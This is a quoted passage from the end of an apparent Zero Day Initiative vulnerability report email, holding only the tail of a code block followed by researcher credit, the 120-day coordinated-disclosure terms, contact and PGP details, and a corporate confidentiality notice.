> 	return 0;
> }
> ```
> 
> 
> -- CREDIT ---------------------------------------
> This vulnerability was discovered by:
> HYEONTAE LEE working with TrendAI Zero Day Initiative
> 
> -- FURTHER DETAILS ------------------------------
> 
> Supporting files:
> 
> 
> If supporting files were contained with this report they are provided within a password protected ZIP file. The password is the ZDI candidate number in the form: ZDI-CAN-XXXX where XXXX is the ID number.
> 
> Please confirm receipt of this report. We expect all vendors to remediate ZDI vulnerabilities within 120 days of the reported date. If you are ready to release a patch at any point leading up to the deadline, please coordinate with us so that we may release our advisory detailing the issue. If the 120-day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations, so that the public can protect themselves in the absence of a patch. Please keep us updated regarding the status of this issue and feel free to contact us at any time:
> 
> Zero Day Initiative
> zdi-disclosures@trendmicro.com
> 
> The PGP key used for all ZDI vendor communications is available from:
> 
>    http://www.zerodayinitiative.com/documents/disclosures-pgp-key.asc
> 
> -- INFORMATION ABOUT THE ZDI --------------------
> Established by TippingPoint and acquired by Trend Micro, the Zero Day Initiative (ZDI) neither re-sells vulnerability details nor exploit code. Instead, upon notifying the affected product vendor, the ZDI provides its Trend Micro TippingPoint customers with zero day protection through its intrusion prevention technology. Explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available.
> 
> Please contact us for further details or refer to:
> 
>    http://www.zerodayinitiative.com
> 
> -- DISCLOSURE POLICY ----------------------------
> 
> Our vulnerability disclosure policy is available online at:
> 
>    http://www.zerodayinitiative.com/advisories/disclosure_policy/
>      
> TREND MICRO EMAIL NOTICE
> The information contained in this email and any attachments is confidential
> and may be subject to copyright or other intellectual property protection.
> If you are not the intended recipient, you are not authorized to use or
> disclose this information, and we request that you notify us by reply mail or
> telephone and delete the original message from your mail system.
> For details about what personal information we collect and why, please see our Privacy Notice on our website at: [ https://www.trendmicro.com/privacy]

